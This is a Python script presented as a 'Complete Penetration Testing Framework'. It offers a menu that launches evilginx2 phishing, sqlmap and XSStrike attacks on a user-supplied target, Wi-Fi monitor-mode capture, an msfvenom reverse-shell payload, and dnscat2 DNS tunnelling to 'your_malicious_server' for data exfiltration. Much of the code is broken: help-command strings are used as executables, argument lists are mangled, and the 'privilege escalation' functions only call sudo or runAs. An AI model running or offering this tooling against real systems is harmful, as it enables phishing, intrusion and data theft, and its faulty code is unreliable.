import os
import subprocess
import time
import sys

# Define tool checks
def check_tool(tool_name):
    """Check if the tool is installed on the system."""
    try:
        subprocess.run([tool_name, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

# Banner for the framework
def print_banner():
    print("""
    ███████╗████████╗ ██████╗ ███████╗████████╗███████╗
    ╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝╚══██╔══╝██╔════╝
       ██║      ██║   ██████╔╝█████╗     ██║   █████╗
       ██║      ██║   ██╔══██╗██╔══╝     ██║   ██╔══╝
       ██║      ██║   ██║  ██║███████╗   ██║   ███████╗
       ╚═╝      ╚═╝   ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝
    """)

# Tools and their commands
TOOLS = {
    'sqlmap': 'sqlmap --help',  # SQL Injection Automation
    'xsstrike': 'xsstrike --help',  # XSS Scanner
    'aircrack-ng': 'airmon-ng --help',  # Wi-Fi Deauth, Cracking
    'metasploit': 'msfvenom --help',  # Metasploit Payload Generation
    'evilginx2': 'evilginx2 --help',  # Advanced Phishing (session hijacking)
    'nmap': 'nmap -v',  # Network Scanning
    'nessus': 'nessus -h',  # Vulnerability Scanning
    'amass': 'amass -h',  # Subdomain Enumeration
    'dnscat2': 'dnscat2 --help',  # DNS Tunneling for Exfiltration
}

# Global settings
TARGET = None  # Placeholder for target URL or IP
USER_AGENT = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# Tool checking function
def check_tools():
    missing_tools = []
    for tool, command in TOOLS.items():
        if not check_tool(tool):
            missing_tools.append(tool)
    if missing_tools:
        print(f"Warning: Missing tools: {', '.join(missing_tools)}")
    else:
        print("All tools are installed and ready!")

# Phishing Campaign: Define fake login pages and email sending
def phishing_campaign():
    print("[*] Starting Phishing Campaign with Evilginx2...")
    subprocess.run(["evilginx2", "launch"])

# SQL Injection Automation: Using sqlmap
def sql_injection(url):
    print(f"[*] Running SQL Injection Test on {url}")
    subprocess.run([TOOLS['sqlmap'], f"-u {url} --batch"])

# XSS Testing: Using XSStrike
def test_xss(url):
    print(f"[*] Running XSS Testing on {url}")
    subprocess.run([TOOLS['xsstrike'], f"-u {url} --batch"])

# Network Scanning with Nmap
def network_scan(target):
    print(f"[*] Running Network Scan on {target}")
    subprocess.run([TOOLS['nmap'], target])

# Automating Wi-Fi Attacks with aircrack-ng
def wifi_attack(interface):
    print(f"[*] Setting {interface} to monitor mode for Wi-Fi attacks...")
    subprocess.run(["airmon-ng", "start", interface])
    subprocess.run(["airodump-ng", interface])

# Metasploit Payload Creation (Reverse Shell)
def metasploit_payload():
    print("[*] Generating Metasploit payload...")
    subprocess.run([TOOLS['metasploit'], "-p linux/x86/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f elf > shell.elf"])

# Subdomain Enumeration with Amass
def subdomain_enum(domain):
    print(f"[*] Enumerating subdomains for {domain}")
    subprocess.run([TOOLS['amass'], "enum", "-d", domain])

# Data Exfiltration with DNS Tunneling (dnscat2 or iodine)
def dns_tunneling():
    print("[*] Starting DNS Tunneling for Data Exfiltration...")
    subprocess.run([TOOLS['dnscat2'], "--dns", "your_malicious_server"])

# Privilege Escalation for Linux (example with basic local privilege escalation)
def linux_priv_escalation():
    print("[*] Attempting Linux Privilege Escalation...")
    subprocess.run(["sudo", "python3", "-c", "import os; os.system('/bin/bash')"])

# Privilege Escalation for Windows (example with basic Windows privilege escalation)
def windows_priv_escalation():
    print("[*] Attempting Windows Privilege Escalation...")
    subprocess.run(["powershell", "Start-Process cmd.exe -Verb runAs"])

# Main driver function for the framework
def main():
    print_banner()  # Display the banner
    check_tools()  # Check if all tools are available
    
    print("[*] Welcome to the Complete Penetration Testing Framework!")
    print("[*] Please choose an option:")
    print("1. Phishing Campaign")
    print("2. SQL Injection Testing")
    print("3. XSS Testing")
    print("4. Network Scan")
    print("5. Wi-Fi Deauth Attack")
    print("6. Generate Metasploit Payload")
    print("7. Subdomain Enumeration")
    print("8. DNS Tunneling Exfiltration")
    print("9. Linux Privilege Escalation")
    print("10. Windows Privilege Escalation")
    print("11. Automated Recon & Information Gathering")
    print("12. Vulnerability Scanning (Nessus or OpenVAS)")

    choice = input("Enter your choice: ")

    if choice == "1":
        phishing_campaign()
    elif choice == "2":
        url = input("Enter target URL for SQLi test: ")
        sql_injection(url)
    elif choice == "3":
        url = input("Enter target URL for XSS test: ")
        test_xss(url)
    elif choice == "4":
        target_ip = input("Enter target IP for Nmap scan: ")
        network_scan(target_ip)
    elif choice == "5":
        interface = input("Enter interface for Wi-Fi deauth (e.g., wlan0): ")
        wifi_attack(interface)
    elif choice == "6":
        metasploit_payload()
    elif choice == "7":
        domain = input("Enter domain for subdomain enumeration: ")
        subdomain_enum(domain)
    elif choice == "8":
        dns_tunneling()
    elif choice == "9":
        linux_priv_escalation()
    elif choice == "10":
        windows_priv_escalation()
    elif choice == "11":
        target_ip = input("Enter target IP for recon (subdomains, ports, services): ")
        network_scan(target_ip)
        subdomain_enum(target_ip)
    elif choice == "12":
        target_ip = input("Enter target IP for vulnerability scanning: ")
        subprocess.run([TOOLS['nessus'], "-v", target_ip])
    else:
        print("[!] Invalid choice!")

# Run the script
if __name__ == "__main__":
    main()
